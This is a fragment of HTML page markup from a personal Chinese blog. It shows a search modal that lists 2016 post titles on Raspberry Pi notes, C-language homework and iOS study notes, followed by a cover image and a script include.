                HUST, Wuhan, China
            </div>
        
    </div>
</div>

        <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-close"></i></span>
            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    />
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">没有找到文章</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/01/04/e5-8d-9a-e5-ae-a2-e4-b8-8a-e7-ba-bf/">
                            <h3 class="media-heading">博客上线</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年1月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/02/09/e6-a0-91-e8-8e-93-e6-b4-be-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/">
                            <h3 class="media-heading">树莓派学习笔记（一）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年2月9日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/04/03/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-b8-80-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第一次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年4月3日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/04/25/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-ba-8c-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第二次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年4月25日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/01/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-b8-89-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第三次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月1日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/01/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（一）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月1日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/18/79-2/">
                            <h3 class="media-heading">C语言第四次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月18日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/06/12/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（二）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年6月12日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/06/20/c-e8-af-ad-e8-a8-80-e5-a4-8d-e4-b9-a0-e9-97-ae-e9-a2-98-e6-80-bb-e7-bb-93/">
                            <h3 class="media-heading">C语言复习问题总结</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年6月20日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/07/06/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-89-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（三）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年7月6日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="没有找到文章"
                data-message-one="找到 1 篇文章"
                data-message-other="找到 {n} 篇文章">
                找到 23 篇文章
            </p>
        </div>
    </div>
</div>

        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-he4hmxof1aagptuktwd9dfzd7rgjrefvbflppkmlhmhhxqoapcduvw2trjz2.min.js"></script>
<!--SCRIPTS END-->

    


    </body>
</html>
